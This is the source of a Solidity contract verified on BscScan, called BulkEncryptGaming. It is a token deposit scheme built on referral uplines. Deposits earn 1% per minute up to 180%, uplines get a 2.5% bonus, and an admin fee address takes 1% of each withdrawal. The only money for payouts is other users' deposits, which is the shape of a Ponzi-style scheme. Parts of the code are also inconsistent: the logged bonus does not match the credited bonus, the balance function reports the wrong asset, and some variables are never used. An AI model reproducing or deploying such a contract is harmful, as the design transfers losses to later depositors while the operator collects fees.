/**
 *Submitted for verification at BscScan.com on 2021-03-08
*/

/**
 *Submitted for verification at BscScan.com on 2021-02-25
*/

pragma solidity ^0.7.0;
//import "./SafeMath.sol";
import "./IERC20.sol";
contract BulkEncryptGaming {
    using SafeMath for uint256;
    struct User {
        uint256 cycle;
        address upline;
        uint256 referrals;
        uint256 payouts;
        uint256 direct_bonus;
        uint256 deposit_amount;
        uint256 deposit_payouts;
        uint256 deposit_time;
        uint256 total_deposits;
        uint256 total_payouts;
        uint256 total_structure;
    }
    uint256 basePercent=1000;
    address public owner;
    address public etherchain_fund;
    address public admin_fee;
    mapping(address => User) public users;

    uint40 public pool_last_draw = uint40(block.timestamp);
    uint256 public pool_cycle;
    uint256 public pool_balance;
    mapping(uint256 => mapping(address => uint256)) public pool_users_refs_deposits_sum;
    mapping(uint8 => address) public pool_top;

    uint256 public total_users = 1;
    uint256 public total_deposited;
    uint256 public total_withdraw;
    
    BlkEncryptGaming public token;
    
    event Upline(address indexed addr, address indexed upline);
    event NewDeposit(address indexed addr, uint256 amount);
    event DirectPayout(address indexed addr, address indexed from, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event PoolPayout(address indexed addr, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);
    event LimitReached(address indexed addr, uint256 amount);
    
    constructor(address _owner,address _admin_fee,BlkEncryptGaming _token) public {
        owner = _owner;
        admin_fee =_admin_fee;
        token=_token;
    }

 
    function _setUpline(address _addr, address _upline) private {
        if(users[_addr].upline == address(0) && _upline != _addr && _addr != owner && (users[_upline].deposit_time > 0 || _upline == owner)) {
            users[_addr].upline = _upline;
            users[_upline].referrals++;

            emit Upline(_addr, _upline);
            total_users++;

        }
        
        
        
    }

    function _deposit(address _addr, uint256 _amount) private {
        require(users[_addr].upline != address(0) || _addr == owner, "No upline");
        if(users[_addr].deposit_time > 0) {
            users[_addr].cycle++;
            require(users[_addr].payouts >= this.maxPayoutOf(users[_addr].deposit_amount), "Deposit already exists");
            require(_amount >= 1e18, "Bad amount");
        }
        else require(_amount >= 1e18, "Bad amount");
        
        users[_addr].payouts = 0;
        users[_addr].deposit_amount = _amount;
        users[_addr].deposit_payouts = 0;
        users[_addr].deposit_time = uint40(block.timestamp);
        users[_addr].total_deposits += _amount;

        total_deposited += _amount;
        token.transferFrom(msg.sender,address(this),_amount);
        
        emit NewDeposit(_addr, _amount);

        if(users[_addr].upline != address(0)) {
            address refferal1=users[_addr].upline;
            users[refferal1].direct_bonus +=(_amount*25)/basePercent;
            
            emit DirectPayout(users[_addr].upline, _addr, _amount / 10);
        }
        
        }
        
    function deposit(address _upline,uint256 _amount) external {
        _setUpline(msg.sender, _upline);
        _deposit(msg.sender, _amount);
    }

    function withdraw() external {
        
        (uint256 to_payout, uint256 max_payout) = this.payoutOf(msg.sender);
        
        require(users[msg.sender].payouts < max_payout, "Full payouts");

        // Deposit payout
        if(to_payout > 0) {
            if(users[msg.sender].payouts + to_payout > max_payout) {
                to_payout = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].deposit_payouts += to_payout;
            users[msg.sender].payouts += to_payout;

        }
        
        // Direct payout
        if(users[msg.sender].payouts < max_payout && users[msg.sender].direct_bonus > 0) {
            uint256 direct_bonus = users[msg.sender].direct_bonus;

            if(users[msg.sender].payouts + direct_bonus > max_payout) {
                direct_bonus = max_payout - users[msg.sender].payouts;
            }

            users[msg.sender].direct_bonus -= direct_bonus;
            users[msg.sender].payouts += direct_bonus;
            to_payout += direct_bonus;
        }

        require(to_payout > 0, "Zero payout");
        
        users[msg.sender].total_payouts += to_payout;
        total_withdraw += to_payout;

        uint256 actual_payout = to_payout * 90 / 100;
        
        uint256 admin_amount = to_payout * 1 / 100 ;
        
        token.transfer(msg.sender,actual_payout);
        
        token.transfer(admin_fee,admin_amount);

        emit Withdraw(msg.sender, to_payout);

        if(users[msg.sender].payouts >= max_payout) {
            emit LimitReached(msg.sender, users[msg.sender].payouts);
        }
        
    }
    
    function maxPayoutOf(uint256 _amount) pure external returns(uint256) {
        return _amount * 180 / 100;
    }

    function payoutOf(address _addr) view external returns(uint256 payout, uint256 max_payout) {
        max_payout = this.maxPayoutOf(users[_addr].deposit_amount);

        if(users[_addr].deposit_payouts < max_payout) {
            payout = (((users[_addr].deposit_amount * ((block.timestamp - users[_addr].deposit_time) / 1 minutes) / 100)) - users[_addr].deposit_payouts);
            
            if(users[_addr].deposit_payouts + payout > max_payout) {
                payout = max_payout - users[_addr].deposit_payouts;
            }
        }
    }

    /*
        Only external call
    */
    function userInfo(address _addr) view external returns(address upline, uint256 deposit_time, uint256 deposit_amount, uint256 payouts, uint256 direct_bonus) {
        return (users[_addr].upline, users[_addr].deposit_time, users[_addr].deposit_amount, users[_addr].payouts, users[_addr].direct_bonus);
    }

    function userInfoTotals(address _addr) view external returns(uint256 referrals, uint256 total_deposits, uint256 total_payouts, uint256 total_structure) {
        return (users[_addr].referrals, users[_addr].total_deposits, users[_addr].total_payouts, users[_addr].total_structure);
    }

    function contractInfo() view external returns(uint256 _total_users, uint256 _total_deposited, uint256 _total_withdraw, uint40 _pool_last_draw, uint256 _pool_balance, uint256 _pool_lider) {
        return (total_users, total_deposited, total_withdraw, pool_last_draw, pool_balance, pool_users_refs_deposits_sum[pool_cycle][pool_top[0]]);
    }
    function getContractBalance()view public returns(uint256){
        return (address(this).balance);
}
}
library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
    
}